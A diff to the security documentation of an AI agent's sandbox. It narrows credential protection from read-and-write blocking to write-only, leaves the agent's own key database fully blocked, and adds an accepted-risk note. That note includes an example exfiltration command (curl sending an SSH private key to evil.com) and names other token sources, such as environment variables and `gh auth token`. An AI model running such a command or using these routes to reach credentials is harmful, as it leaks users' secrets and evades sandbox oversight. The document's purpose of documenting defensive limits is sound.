@@ -15,10 +15,13 @@ Bash commands can only write to:
 
 ### Credential protection
 
-The following directories and files are blocked from both read and write
-access, preventing the model from exfiltrating secrets:
+Credential directories and files are **write-protected** — sandboxed
+commands cannot modify them, but CLI tools can still *read* their own
+config to authenticate. This follows the Codex model where the entire
+host filesystem is read-only and credential dirs are not special-cased
+beyond that.
 
-**Directories:**
+**Write-protected directories** (reads allowed):
 - `~/.ssh` — SSH private keys
 - `~/.aws` — AWS credentials
 - `~/.gnupg` — GPG private keys
@@ -30,11 +33,26 @@ access, preventing the model from exfiltrating secrets:
 - `~/.config/gh` — GitHub CLI PATs
 - `~/.config/op` — 1Password CLI tokens
 - `~/.config/helm` — Helm registry auth
-- `~/.config/koda/db` — Koda's SQLite DB (contains API keys)
 
-**Files:**
+**Write-protected files** (reads allowed):
 `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`,
 `~/.docker/config.json`, `~/.vault-token`, `~/.env`
+
+**Fully blocked (read + write):**
+- `~/.config/koda/db` — Koda's SQLite DB containing plaintext API keys
+
+> **Security note — accepted risk:** A sandboxed command can read
+> credential material and could exfiltrate it over the network (e.g.
+> `curl https://evil.com -d @~/.ssh/id_rsa`). Blocking credential
+> reads without blocking network egress is security theater — the
+> model could also obtain tokens from environment variables, process
+> output, or tool-specific commands like `gh auth token`. Network-level
+> egress restriction ([#844 Gap 4](https://github.com/lijunzh/koda/issues/844))
+> is the proper mitigation and is tracked separately.
+>
+> The only exception is `koda/db` — koda's own API keys have no
+> legitimate use inside the sandbox (the koda process runs *outside*
+> the sandbox), so full read+write deny is justified.
 
 ### Agent-file protection
 
